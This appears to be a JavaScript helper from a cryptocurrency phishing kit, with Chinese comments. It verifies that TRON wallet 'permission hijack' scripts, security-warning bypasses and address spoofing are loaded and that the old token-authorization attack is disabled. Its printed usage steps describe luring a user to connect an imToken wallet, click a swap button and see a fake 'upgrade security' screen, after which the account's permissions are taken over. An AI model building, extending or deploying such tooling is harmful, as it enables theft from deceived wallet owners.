/**
 * 攻击焦点验证器 - 确保只执行权限劫持攻击
 * 🔬 验证传统授权攻击已禁用，权限劫持攻击正确启用
 */

(function() {
    'use strict';
    
    console.log('🔬 攻击焦点验证器已加载');
    
    // 验证结果
    let validationResults = {
        permissionHijackAvailable: false,
        maliciousAuthDisabled: false,
        integratedBypassAvailable: false,
        attackButtonLogicCorrect: false,
        scriptsLoadedCorrectly: false,
        overallStatus: 'CHECKING'
    };
    
    // 🔬 验证权限劫持攻击系统
    function validatePermissionHijack() {
        console.log('🔬 验证权限劫持攻击系统...');
        
        // 检查核心组件
        const checks = {
            PermissionHijack: !!window.PermissionHijack,
            PermissionHijackInit: !!(window.PermissionHijack?.init),
            PermissionHijackDetect: !!(window.PermissionHijack?.detect),
            PermissionHijackStatus: !!(window.PermissionHijack?.status),
            PermissionHijackStats: !!(window.PermissionHijack?.getStats)
        };
        
        const allAvailable = Object.values(checks).every(check => check);
        validationResults.permissionHijackAvailable = allAvailable;
        
        console.log('🔬 权限劫持系统检查:', checks);
        return allAvailable;
    }
    
    // 🔬 验证传统授权攻击已禁用
    function validateMaliciousAuthDisabled() {
        console.log('🔬 验证传统授权攻击禁用状态...');
        
        // 检查MaliciousAuth是否还能自动启动
        const maliciousAuthExists = !!window.MaliciousAuth;
        const autoInitDisabled = !window.MaliciousAuth?.autoInit;
        
        // 检查页面中是否还有自动启动代码
        const bodyText = document.body.innerHTML;
        const hasAutoMaliciousAuth = bodyText.includes('window.MaliciousAuth.init()') && 
                                    !bodyText.includes('// window.MaliciousAuth.init()');
        
        const isDisabled = !hasAutoMaliciousAuth;
        validationResults.maliciousAuthDisabled = isDisabled;
        
        console.log('🔬 传统授权攻击检查:', {
            maliciousAuthExists,
            autoInitDisabled,
            hasAutoMaliciousAuth,
            isDisabled
        });
        
        return isDisabled;
    }
    
    // 🔬 验证集成绕过系统
    function validateIntegratedBypass() {
        console.log('🔬 验证集成绕过系统...');
        
        const checks = {
            IntegratedBypass: !!window.IntegratedBypass,
            IntegratedBypassInit: !!(window.IntegratedBypass?.init),
            IntegratedBypassHideWarnings: !!(window.IntegratedBypass?.hideWarnings),
            IntegratedBypassEnvironment: !!(window.IntegratedBypass?.environment)
        };
        
        const allAvailable = Object.values(checks).every(check => check);
        validationResults.integratedBypassAvailable = allAvailable;
        
        console.log('🔬 集成绕过系统检查:', checks);
        return allAvailable;
    }
    
    // 🔬 验证攻击按钮逻辑
    function validateAttackButtonLogic() {
        console.log('🔬 验证攻击按钮逻辑...');
        
        // 检查connectImToken函数是否包含权限劫持逻辑
        if (typeof window.connectImToken === 'function') {
            const functionText = window.connectImToken.toString();
            
            const hasPermissionHijackCall = functionText.includes('PermissionHijack.detect');
            const hasPermissionHijackLog = functionText.includes('权限劫持攻击');
            const hasOldAuthCall = functionText.includes('MaliciousAuth.detectWallet') && 
                                  !functionText.includes('fallback');
            
            const isCorrect = hasPermissionHijackCall && hasPermissionHijackLog && !hasOldAuthCall;
            validationResults.attackButtonLogicCorrect = isCorrect;
            
            console.log('🔬 攻击按钮逻辑检查:', {
                hasPermissionHijackCall,
                hasPermissionHijackLog,
                hasOldAuthCall,
                isCorrect
            });
            
            return isCorrect;
        }
        
        return false;
    }
    
    // 🔬 验证脚本加载情况
    function validateScriptsLoaded() {
        console.log('🔬 验证脚本加载情况...');
        
        const scripts = Array.from(document.querySelectorAll('script[src]'));
        const scriptSources = scripts.map(s => s.src.split('/').pop());
        
        const requiredScripts = [
            'integrated-security-bypass.js',
            'tron-permission-hijack.js',
            'permission-hijack-tester.js'
        ];
        
        const optionalScripts = [
            'stable-security-bypass.js',
            'simple-address-spoofing.js'
        ];
        
        const disabledScripts = [
            'malicious-authorization.js'
        ];
        
        const checks = {
            requiredScriptsLoaded: requiredScripts.every(script => 
                scriptSources.some(src => src.includes(script))
            ),
            maliciousAuthDisabled: !scriptSources.some(src => 
                src.includes('malicious-authorization.js') && 
                !scripts.find(s => s.src.includes('malicious-authorization.js'))?.outerHTML.includes('<!--')
            )
        };
        
        // 检查malicious-authorization.js是否被注释掉
        const htmlText = document.documentElement.innerHTML;
        const maliciousAuthCommented = htmlText.includes('<!-- <script src="malicious-authorization.js"></script> -->');
        
        const allCorrect = checks.requiredScriptsLoaded && maliciousAuthCommented;
        validationResults.scriptsLoadedCorrectly = allCorrect;
        
        console.log('🔬 脚本加载检查:', {
            requiredScriptsLoaded: checks.requiredScriptsLoaded,
            maliciousAuthCommented,
            scriptSources,
            allCorrect
        });
        
        return allCorrect;
    }
    
    // 🔬 运行完整验证
    function runFullValidation() {
        console.log('🔬🔬🔬 开始攻击焦点验证 🔬🔬🔬');
        
        const results = {
            permissionHijack: validatePermissionHijack(),
            maliciousAuthDisabled: validateMaliciousAuthDisabled(),
            integratedBypass: validateIntegratedBypass(),
            buttonLogic: validateAttackButtonLogic(),
            scriptsLoaded: validateScriptsLoaded()
        };
        
        // 计算总体状态
        const passedChecks = Object.values(results).filter(r => r).length;
        const totalChecks = Object.keys(results).length;
        
        if (passedChecks === totalChecks) {
            validationResults.overallStatus = 'ALL_PASSED';
        } else if (passedChecks >= totalChecks * 0.8) {
            validationResults.overallStatus = 'MOSTLY_PASSED';
        } else {
            validationResults.overallStatus = 'FAILED';
        }
        
        // 生成验证报告
        generateValidationReport(results);
        
        return {
            results,
            validationResults,
            summary: {
                passed: passedChecks,
                total: totalChecks,
                status: validationResults.overallStatus
            }
        };
    }
    
    // 🔬 生成验证报告
    function generateValidationReport(results) {
        console.log('\n🔬🔬🔬 攻击焦点验证报告 🔬🔬🔬');
        console.log(`📊 总体状态: ${validationResults.overallStatus}`);
        
        console.log('\n📋 详细检查结果:');
        const checkItems = [
            { key: 'permissionHijack', name: '权限劫持攻击系统', critical: true },
            { key: 'maliciousAuthDisabled', name: '传统授权攻击禁用', critical: true },
            { key: 'integratedBypass', name: '集成绕过系统', critical: true },
            { key: 'buttonLogic', name: '攻击按钮逻辑', critical: true },
            { key: 'scriptsLoaded', name: '脚本加载正确性', critical: false }
        ];
        
        checkItems.forEach(item => {
            const status = results[item.key];
            const icon = status ? '✅' : '❌';
            const criticaltag = item.critical ? '🚨' : '';
            console.log(`${icon} ${criticaltag} ${item.name}: ${status ? 'PASSED' : 'FAILED'}`);
        });
        
        console.log('\n🎯 验证结论:');
        if (validationResults.overallStatus === 'ALL_PASSED') {
            console.log('✅ 所有检查通过，系统已正确配置为权限劫持攻击模式');
            console.log('✅ 传统代币授权攻击已成功禁用');
            console.log('✅ 用户点击兑换按钮将触发权限劫持攻击，而不是代币授权');
        } else if (validationResults.overallStatus === 'MOSTLY_PASSED') {
            console.log('⚠️ 大部分检查通过，但存在一些问题需要修复');
        } else {
            console.log('❌ 多项检查失败，系统配置可能不正确');
        }
        
        console.log('\n📝 使用说明:');
        console.log('1. 用户访问页面并连接钱包');
        console.log('2. 输入TRX数量并点击兑换按钮');  
        console.log('3. 系统将启动权限劫持攻击而不是代币授权攻击');
        console.log('4. 用户会看到伪装的"升级安全性"等界面');
        console.log('5. 攻击成功后用户账户权限被劫持');
    }
    
    // 🔬 暴露验证接口
    window.AttackFocusValidator = {
        runValidation: runFullValidation,
        validatePermissionHijack: validatePermissionHijack,
        validateMaliciousAuthDisabled: validateMaliciousAuthDisabled,
        validateIntegratedBypass: validateIntegratedBypass,
        validateAttackButtonLogic: validateAttackButtonLogic,
        validateScriptsLoaded: validateScriptsLoaded,
        getResults: () => validationResults
    };
    
    // 自动执行验证（延迟确保所有脚本加载完成）
    setTimeout(() => {
        runFullValidation();
    }, 3000);
    
    console.log('🔬 攻击焦点验证器准备就绪');
    console.log('🔬 使用 window.AttackFocusValidator.runValidation() 手动运行验证');
    
})();